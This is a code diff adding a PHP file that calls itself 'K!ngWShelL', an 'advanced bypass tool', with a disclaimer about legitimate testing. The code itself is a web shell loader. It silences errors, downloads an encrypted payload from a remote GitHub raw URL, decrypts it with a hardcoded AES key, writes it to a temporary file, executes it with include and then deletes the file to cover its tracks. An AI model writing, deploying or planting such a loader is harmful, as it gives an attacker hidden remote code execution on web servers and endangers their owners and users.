@@ -1,0 +1,103 @@
+<?php
+/**
+ * K!ngWShelL - Advanced PHP Bypass Tool (OOP Version)
+ *
+ * K!ngWShelL is a powerful tool to perform bypasses in web application security testing using 
+ * object-oriented programming (OOP) approach. This tool can retrieve content from a specific URL, 
+ * decrypt data, and execute PHP files dynamically.
+ *
+ * @author ScandalL7x
+ * @version 2.0 - New Version
+ * @link http://hackncorp.my.id/
+ *
+ * @license MIT License
+ * @see http://hackncorp.my.id/
+ *
+ * @use
+ * Use this tool wisely and in accordance with applicable laws. 
+ * For legitimate educational and security testing purposes only
+ */
+error_reporting(0);
+ini_set('display_errors', 0);
+session_start();
+
+class Kepobabi {
+    public static function get($url) {
+        if (function_exists('curl_exec')) {
+            $conn = curl_init($url);
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+            $gkusahkayababi = curl_exec($conn);
+            curl_close($conn);
+        } elseif (function_exists('file_get_contents')) {
+            $gkusahkayababi = file_get_contents($url);
+        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+            $handle = fopen($url, "r");
+            $gkusahkayababi = stream_get_contents($handle);
+            fclose($handle);
+        } else {
+            return false;
+        }
+        return $gkusahkayababi;
+    }
+}
+
+class ScandalL7x {
+    private $key;
+    private $iv;
+    private $cipherText;
+    private $tempFile;
+
+    public function __construct($key, $encodedData) {
+        $this->key = $key;
+        $this->cipherText = base64_decode($encodedData);
+        $this->iv = substr($this->cipherText, 0, 16);
+        $this->cipherText = substr($this->cipherText, 16);
+    }
+
+    public function LutfiGanteng() {
+        return openssl_decrypt($this->cipherText, 'aes-256-cbc', $this->key, OPENSSL_RAW_DATA, $this->iv);
+    }
+
+    public function nubkontol() {
+        $this->tempFile = tempnam(sys_get_temp_dir(), 'ScandalL7x_');
+        if ($this->tempFile === false) {
+            echo 'Gagal menulis ke file sementara.';
+        }
+        return $this->tempFile;
+    }
+
+    public function mangeak($data) {
+        if (file_put_contents($this->tempFile, $data) === false) {
+            echo 'Gagal menulis ke file sementara.';
+        }
+    }
+
+    public function gkusahgantiganti() {
+        if (file_exists($this->tempFile)) {
+            include $this->tempFile;
+            unlink($this->tempFile);
+        }
+    }
+}
+
+$K1ngW = 'ScandalL7x';
+$Nuub = Kepobabi::get('github.com/X-Projetion/cs-new/raw/refs/heads/main/burhan.txt');
+if ($Nuub !== false) {
+    $ScandalL7x = new ScandalL7x($K1ngW, $Nuub);
+    $Kentod = $ScandalL7x->LutfiGanteng();
+
+    try {
+        $tempFile = $ScandalL7x->nubkontol();
+        $ScandalL7x->mangeak($Kentod);
+        $ScandalL7x->gkusahgantiganti();
+    } catch (Exception $e) {
+        echo 'Error: ' . $e->getMessage();
+    }
+} else {
+    echo 'Gagal mendapatkan konten dari URL.';
+}
+?>
